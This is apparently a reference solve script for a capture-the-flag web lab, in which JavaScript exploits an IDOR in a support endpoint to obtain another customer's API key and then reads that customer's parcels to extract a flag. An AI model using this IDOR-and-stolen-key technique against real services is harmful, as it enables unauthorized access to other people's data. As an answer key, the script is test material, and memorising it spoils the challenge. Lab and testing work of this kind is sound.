// Reference solve — Courier, Inquisitor. Open a demo session, ask support for the vault customer's API key (the
// IDOR: support returns any customer's key and parcel list to any session), then read each vault parcel with the
// demo bearer AND the vault key. The flag is no longer the note: it has moved to the manifest of a random vault
// parcel. Print only the flag. On a refusal (for example Divine's 403) the solve is silent and exits 0, like the
// other reference solves.
const base = process.argv[2];
const session = await (await fetch(`${base}/api/session`, { method: 'POST' })).json();
const auth = { authorization: `Bearer ${session.token}` };
const support = await fetch(`${base}/api/support/customers/vault`, { headers: auth });
if (!support.ok) process.exit(0);
const { apiKey, parcels } = await support.json();
if (typeof apiKey !== 'string' || !apiKey || !Array.isArray(parcels)) process.exit(0);
for (const id of parcels) {
  const r = await fetch(`${base}/api/parcels/${id}`, { headers: { ...auth, 'x-api-key': apiKey } });
  if (!r.ok) continue;
  const { manifest } = await r.json();
  const m = /HVWA\{[a-z2-7]{26}\}/.exec(manifest ?? '');
  if (m) { console.log(m[0]); break; }
}
